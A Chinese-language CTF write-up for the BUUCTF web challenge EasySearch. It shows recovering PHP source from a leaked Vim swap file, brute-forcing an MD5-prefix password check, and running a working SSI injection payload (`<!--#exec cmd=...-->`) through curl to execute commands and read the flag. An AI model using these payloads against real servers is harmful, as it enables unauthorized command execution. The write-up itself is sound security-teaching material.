---
title: "[BJDCTF2020]EasySearch"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [ssi-injection, vim-swp, md5-bypass, information-disclosure]
vulnerability: Vim swap 文件泄露源码 + SSI 注入漏洞
solved: true
flag: "flag{d15ac59c-7558-4f87-9a02-cd92d0b5dfba}"
---

# [BJDCTF2020]EasySearch

## 题目概述
题目是一个登录页面，需要找到正确的密码登录，然后利用漏洞获取 flag。

## 信息收集
1. 访问首页，发现是一个登录表单，提交到 `index.php`
2. 扫描备份文件，发现 `index.php.swp` 存在（HTTP 200）
3. 下载 swp 文件，使用 `strings` 命令恢复出 PHP 源码

## 漏洞分析（漏洞类型、原理、判断过程）

### 漏洞1：Vim Swap 文件泄露
- **原理**：Vim 编辑文件时会创建 `.swp` 交换文件，如果非正常退出，swp 文件会保留
- **利用**：访问 `/index.php.swp` 下载文件，用 `strings` 命令恢复源码

### 漏洞2：弱密码验证
- **原理**：源码中密码验证逻辑为 `substr(md5($_POST['password']),0,6) == '6d0bc1'`
- **利用**：爆破找到 MD5 前6位为 `6d0bc1` 的密码，得到 `2020666`

### 漏洞3：SSI 注入
- **原理**：登录成功后，用户名被直接写入 `.shtml` 文件，无过滤
- **利用**：SSI (Server Side Includes) 是服务端包含指令，`<!--#exec cmd="命令"-->` 可执行系统命令

## 利用过程（Payload + Flag）

### Step 1：获取源码
```bash
curl -s "http://target/index.php.swp" -o index.php.swp
strings index.php.swp  # 恢复源码
```

### Step 2：爆破密码
```python
import hashlib
target = '6d0bc1'
for i in range(100000000):
    if hashlib.md5(str(i).encode()).hexdigest()[:6] == target:
        print(f'Found: {i}')  # 输出: 2020666
        break
```

### Step 3：SSI 注入获取 flag
```bash
# 登录并注入 SSI 命令
curl -s -X POST "http://target/index.php" \
  -d 'username=<!--#exec cmd="cat ../flag_xxx"-->&password=2020666' -i

# 从响应头获取生成的 shtml 文件路径
# Url_is_here: public/xxx.shtml

# 访问 shtml 文件获取命令执行结果
curl -s "http://target/public/xxx.shtml"
```

**Flag**: `flag{d15ac59c-7558-4f87-9a02-cd92d0b5dfba}`

## 复现步骤
1. 访问 `/index.php.swp` 下载 vim 交换文件
2. 使用 `strings` 恢复 PHP 源码，分析登录逻辑
3. 爆破 MD5 前6位为 `6d0bc1` 的密码，得到 `2020666`
4. 使用 SSI 注入 payload 作为用户名登录
5. 访问生成的 shtml 文件获取命令执行结果

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 信息泄露 | /index.php.swp | strings 命令恢复 | vim swap 文件机制 |
| 弱验证 | password 参数 | MD5 前缀碰撞 | substr/md5 弱验证 |
| SSI 注入 | username 参数 | `<!--#exec cmd="cmd"-->` | SSI 指令执行 |

## 知识总结（解题技巧、同类题型套路）
1. **备份文件扫描**：常见后缀 `.swp`, `.bak`, `~`, `.old`, `.zip` 等
2. **MD5 前缀碰撞**：当验证 MD5 前几位时，可快速爆破数字找到匹配值
3. **SSI 注入**：`.shtml` 文件支持服务端包含指令，可执行系统命令
4. **vim swp 恢复**：`vim -r file.swp` 或 `strings file.swp` 恢复内容
